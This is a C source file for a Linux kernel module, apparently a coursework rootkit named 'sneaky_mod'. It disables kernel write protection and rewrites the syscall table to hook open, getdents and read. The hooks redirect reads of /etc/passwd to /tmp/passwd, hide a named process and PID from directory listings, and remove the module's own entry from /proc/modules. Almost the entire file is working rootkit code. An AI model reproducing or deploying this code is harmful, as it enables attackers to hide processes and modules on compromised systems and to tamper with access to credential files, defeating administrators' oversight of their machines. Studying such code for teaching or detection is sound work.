#include <linux/module.h>      // for all modules
#include <linux/init.h>        // for entry/exit macros
#include <linux/kernel.h>      // for printk and other kernel bits
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>
#include <linux/string.h>

struct linux_dirent {
        long d_ino;
        off_t d_off;
        unsigned short d_reclen;
        char d_name[];
};

//name of the variable, its type and
//permissions for the corresponding file in sysfs
static char* process_id = "";
module_param(process_id, charp, 0);
MODULE_PARM_DESC(process_id, "The process id of the sneaky_process");


//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
//We're getting its adddress from the System.map file (see above).
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
static int open_proc_module = 0;
//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect it find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call_open)(const char *pathname, int flags);
asmlinkage int (*original_call_getdents)(unsigned int fd, struct linux_dirent *dirp, unsigned int count);
asmlinkage ssize_t (*original_call_read)(int fd, void *buf, size_t count);
//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  char* mask_passwd_dir = "/tmp/passwd";
  char* hidden_dir = "/etc/passwd";
  char* proc_dir = "/proc/modules";
  char * pathname_no_const = (char *)pathname;
  if(strcmp(pathname, hidden_dir) == 0){
    // we need to open mask passwd file
    //copy_to_user(void __user *to, const void *from, unsigned long nbytes)
    if(copy_to_user(pathname_no_const, mask_passwd_dir, sizeof(mask_passwd_dir))==0){
      return original_call_open(pathname, flags);
    }
  }
  else if(strcmp(pathname, proc_dir) == 0){
    // indicates that the module is open
    open_proc_module = 1;
  }
  return original_call_open(pathname, flags);
  
}
asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count)
{
  //need to do something when the file name is sneaky_process and pid
  
  //convert process id to char* 
  //what we need to do is to remove the dirp for "sneaky_process and sneaky_process_id"
  //111222333444 => 111333444
  //   |  |
  int nread = original_call_getdents(fd, dirp, count);
  int bpos = 0;
  //printk(KERN_INFO "1\n");
//  char p_id[32];
//  sprintf(p_id, "%d", process_id);
//  
  for( ;bpos < nread; ){
     // curr is a struct pointer
    struct linux_dirent * curr = (struct linux_dirent *)((char*)dirp + bpos);
    char* cur = (char *)curr; // cur is char* pointer
    if(strcmp(curr->d_name, "sneaky_process") == 0 || strcmp(curr->d_name, process_id) == 0){
      //char* dst_pos = cur;
      int total_bytes_to_remove = curr->d_reclen;
      char* src_pos = cur + total_bytes_to_remove;
      int bytes_to_copy = ((char*)dirp - src_pos) + nread;
      nread -= total_bytes_to_remove;
      //printk(KERN_INFO "2\n");
      //printk(KERN_INFO "3\n");
      memcpy(cur, src_pos, bytes_to_copy);
      
      continue;
    }
    bpos += curr->d_reclen;
    
  }
  return nread;
  
  
  
  
 

}
asmlinkage ssize_t sneaky_sys_read(int fd, void *buf, size_t count){
  // similar to getdent, when we are trying to read the /proc/modules
  
  int nread = original_call_read(fd, buf, count);
  if(nread == 0){
    return nread;
  }
  if(open_proc_module == 1){
    //the proc/modules file is opened
    int bytes_to_copy;
    char* start = strstr(buf,"sneaky_mod");
    if(start!=NULL){
      //found it. delete that line
      char * end = start;
      while(*end != '\n'){
        end++;
      }
      end++;
      //find the len from end to the end of the buffer
      bytes_to_copy = (char*)buf + nread - end;
      
      //memcpy(start, end, bytes_to_copy);
      memcpy(start, end, bytes_to_copy);
      open_proc_module = 0;
      nread -= (end - start);
    }
  }
  return nread;
}


//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.

  original_call_open = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;
  
  original_call_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;
  
  original_call_read = (void*)*(sys_call_table + __NR_read);
  *(sys_call_table + __NR_read) = (unsigned long)sneaky_sys_read;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);

  return 0;       // to show a successful load
}


static void exit_sneaky_module(void)
{
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n");

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  
  *(sys_call_table + __NR_open) = (unsigned long)original_call_open;
  
  *(sys_call_table + __NR_getdents) = (unsigned long)original_call_getdents;
  
  *(sys_call_table + __NR_read) = (unsigned long)original_call_read;
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}


module_init(initialize_sneaky_module);  // what's called upon loading
module_exit(exit_sneaky_module);        // what's called upon unloading
MODULE_LICENSE("gpl");
